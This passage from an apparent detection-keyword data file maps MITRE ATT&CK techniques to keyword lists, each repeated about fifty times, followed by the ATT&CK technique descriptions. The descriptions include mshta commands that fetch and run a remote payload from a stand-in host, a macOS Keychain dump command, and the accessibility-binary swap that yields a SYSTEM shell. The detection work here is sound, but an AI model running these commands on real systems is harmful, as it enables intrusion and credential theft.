    "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)"
  ],
  "execution guardrails": [
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "environmental keying",
    "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match."
  ],
  "event triggered execution: component object model hijacking": [
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "COM + hijack in same sentence",
    "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. "
  ],
  "event triggered execution: accessibility features": [
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "sticky key ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    "C:\\Windows\\System32\\sethc.exe ",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    " C:\\Windows\\System32\\utilman.exe",
    "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>"
  ],
  "credentials from password stores: keychain": [
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "collect + keychain in same sentence",
    "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  "
  ],
  "system binary proxy execution: mshta": [
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "mshta.exe",
    "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)"
  ],
  "use alternate authentication material: pass the ticket": [
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "pass-the-ticket",
    "Adversaries may \u201cpass the ticket\u201d using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)"
  ],
  "steal or forge kerberos tickets: kerberoasting": [
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Invoke-Kerberoast ",
    "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)"
  ],
  "password policy discovery": [
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    "looks for net and account or domain in close proximity ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " net accounts ",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    " Get-PassPol",
    "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy)."
  ],
  "remote services: windows remote management": [
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
    "winrm",
